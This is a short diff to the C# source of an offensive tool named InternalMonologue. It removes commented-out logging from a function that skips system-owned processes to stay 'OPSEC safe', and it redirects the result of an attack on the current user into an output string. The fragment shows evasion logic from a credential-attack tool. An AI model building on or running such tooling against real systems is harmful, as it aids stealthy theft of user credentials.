@@ -223,17 +223,14 @@ namespace InternalMonologue
 
             if (authenticatedUsers.Contains(SID) == true)
             {
-                //if (verbose) Console.WriteLine("Skipping {0} since it has been already processed.", SID);
                 //Check if the user has been handled previously
                 return false;
             }
             if (SID == "S-1-5-18" || SID == "S-1-5-19" || SID == "S-1-5-20" || SID == "S-1-5-96-0-0" || SID == "S-1-5-96-0-1" || SID == "S-1-5-90-0-1")
             {
                 //do not touch processes owned by system, local service, network service, font driver host, or window manager
-                // if (verbose) Console.WriteLine("{0} is not OPSEC safe, skipping.", SID);
                 return false;
             }
-            //if (verbose) Console.WriteLine("{0} is OPSEC safe.", SID);
             return true; //Check if the SID is OPSEC safe
         }
 
@@ -413,7 +410,7 @@ namespace InternalMonologue
                 else
                 {
                     if (verbose == true) output += "Performing attack on current user only (no impersonation)\n";
-                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
+                    output += InternalMonologueForCurrentUser(challenge) + "\n";
                 }
 
                 if (downgrade == true && restore == true)
